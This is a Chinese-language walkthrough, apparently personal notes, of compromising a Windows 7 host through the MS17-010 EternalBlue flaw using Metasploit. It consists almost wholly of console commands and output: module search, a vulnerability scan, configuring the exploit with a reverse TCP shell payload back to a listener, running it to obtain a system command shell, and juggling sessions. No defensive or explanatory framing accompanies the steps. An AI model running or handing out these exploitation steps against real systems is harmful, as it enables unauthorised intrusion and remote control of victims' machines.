
## 进入metasploit
```
─$ sudo msfconsole
[sudo] password for tank:

                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v6.0.15-dev                          ]
+ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Open an interactive Ruby terminal with irb

msf6 >


```


## 查找存在模块ms17-010

```
msf6 > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 >


```

## 使用辅助模查测试是否存存MS17-010漏洞

```
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 108.88.3.178
RHOSTS => 108.88.3.178
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 108.88.3.178:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 108.88.3.178:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) >
```

## 使用exploit模块

```

msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     108.88.3.166     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 108.88.3.178
RHOSTS => 108.88.3.178
msf6 exploit(windows/smb/ms17_010_eternalblue) >

```

## 配置使用payload模块

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > search payload windows/x64/shell

Matching Modules
================

   #   Name                                          Disclosure Date  Rank    Check  Description
   -   ----                                          ---------------  ----    -----  -----------
   0   exploit/windows/fileformat/vlc_mkv            2018-05-24       great   No     VLC Media Player MKV Use After Free
   1   payload/windows/x64/shell/bind_ipv6_tcp                        normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager
   2   payload/windows/x64/shell/bind_ipv6_tcp_uuid                   normal  No     Windows x64 Command Shell, Windows x64 IPv6 Bind TCP Stager with UUID Support
   3   payload/windows/x64/shell/bind_named_pipe                      normal  No     Windows x64 Command Shell, Windows x64 Bind Named Pipe Stager
   4   payload/windows/x64/shell/bind_tcp                             normal  No     Windows x64 Command Shell, Windows x64 Bind TCP Stager
   5   payload/windows/x64/shell/bind_tcp_rc4                         normal  No     Windows x64 Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
   6   payload/windows/x64/shell/bind_tcp_uuid                        normal  No     Windows x64 Command Shell, Bind TCP Stager with UUID Support (Windows x64)
   7   payload/windows/x64/shell/reverse_tcp                          normal  No     Windows x64 Command Shell, Windows x64 Reverse TCP Stager
   8   payload/windows/x64/shell/reverse_tcp_rc4                      normal  No     Windows x64 Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   9   payload/windows/x64/shell/reverse_tcp_uuid                     normal  No     Windows x64 Command Shell, Reverse TCP Stager with UUID Support (Windows x64)
   10  payload/windows/x64/shell_bind_tcp                             normal  No     Windows x64 Command Shell, Bind TCP Inline
   11  payload/windows/x64/shell_reverse_tcp                          normal  No     Windows x64 Command Shell, Reverse TCP Inline


Interact with a module by name or index. For example info 11, use 11 or use payload/windows/x64/shell_reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) >





msf6 exploit(windows/smb/ms17_010_eternalblue) > set   payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         108.88.3.178     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     108.88.3.166     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf6 exploit(windows/smb/ms17_010_eternalblue) >

```


### 执行攻击获得shell

```


msf6 exploit(windows/smb/ms17_010_eternalblue) >  run

[*] Started reverse TCP handler on 108.88.3.166:4444
[*] 108.88.3.178:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 108.88.3.178:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 108.88.3.178:445      - Scanned 1 of 1 hosts (100% complete)
[*] 108.88.3.178:445 - Connecting to target for exploitation.
[+] 108.88.3.178:445 - Connection established for exploitation.
[+] 108.88.3.178:445 - Target OS selected valid for OS indicated by SMB reply
[*] 108.88.3.178:445 - CORE raw buffer dump (23 bytes)
[*] 108.88.3.178:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 108.88.3.178:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600
[+] 108.88.3.178:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 108.88.3.178:445 - Trying exploit with 12 Groom Allocations.
[*] 108.88.3.178:445 - Sending all but last fragment of exploit packet
[*] 108.88.3.178:445 - Starting non-paged pool grooming
[+] 108.88.3.178:445 - Sending SMBv2 buffers
[+] 108.88.3.178:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 108.88.3.178:445 - Sending final SMBv2 buffers.
[*] 108.88.3.178:445 - Sending last fragment of exploit packet!
[*] 108.88.3.178:445 - Receiving response from exploit packet
[+] 108.88.3.178:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 108.88.3.178:445 - Sending egg to corrupted connection.
[*] 108.88.3.178:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 108.88.3.178
[*] Command shell session 1 opened (108.88.3.166:4444 -> 108.88.3.178:49186) at 2021-02-24 04:55:15 -0500
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



C:\Windows\system32>


```

至此，已经可以获得目录服务shell权限了


## 使用exploit -j后台运行

```

msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 108.88.3.166:4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > [*] 108.88.3.178:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 108.88.3.178:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 108.88.3.178:445      - Scanned 1 of 1 hosts (100% complete)
[*] 108.88.3.178:445 - Connecting to target for exploitation.
[+] 108.88.3.178:445 - Connection established for exploitation.
[+] 108.88.3.178:445 - Target OS selected valid for OS indicated by SMB reply
[*] 108.88.3.178:445 - CORE raw buffer dump (23 bytes)
[*] 108.88.3.178:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 108.88.3.178:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600
[+] 108.88.3.178:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 108.88.3.178:445 - Trying exploit with 12 Groom Allocations.
[*] 108.88.3.178:445 - Sending all but last fragment of exploit packet
[*] 108.88.3.178:445 - Starting non-paged pool grooming
[+] 108.88.3.178:445 - Sending SMBv2 buffers
[+] 108.88.3.178:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 108.88.3.178:445 - Sending final SMBv2 buffers.
[*] 108.88.3.178:445 - Sending last fragment of exploit packet!
[*] 108.88.3.178:445 - Receiving response from exploit packet
[+] 108.88.3.178:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 108.88.3.178:445 - Sending egg to corrupted connection.
[*] 108.88.3.178:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 108.88.3.178
[*] Command shell session 2 opened (108.88.3.166:4444 -> 108.88.3.178:49187) at 2021-02-24 04:57:35 -0500
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 108.88.3.178:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

msf6 exploit(windows/smb/ms17_010_eternalblue) > session
[-] Unknown command: session.
msf6 exploit(windows/smb/ms17_010_eternalblue) > show session
[-] Invalid parameter "session", use "show -h" for more information
msf6 exploit(windows/smb/ms17_010_eternalblue) > show sessions

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  2         shell x64/windows  Microsoft Windows [_ 6.1.7600] _ (c) 2009 Microsoft Corporation_ C:\Windows\s...  108.88.3.166:4444 -> 108.88.3.178:49187 (108.88.3.178)

msf6 exploit(windows/smb/ms17_010_eternalblue) >




msf6 exploit(windows/smb/ms17_010_eternalblue) >  sessions -i 2
[*] Starting interaction with 2...



C:\Windows\system32>



msf6 exploit(windows/smb/ms17_010_eternalblue) >  sessions -i 2
[*] Starting interaction with 2...



C:\Windows\system32>background

Background session 3? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) >  sessions -i 2
[*] Starting interaction with 2...



C:\Windows\system32>



```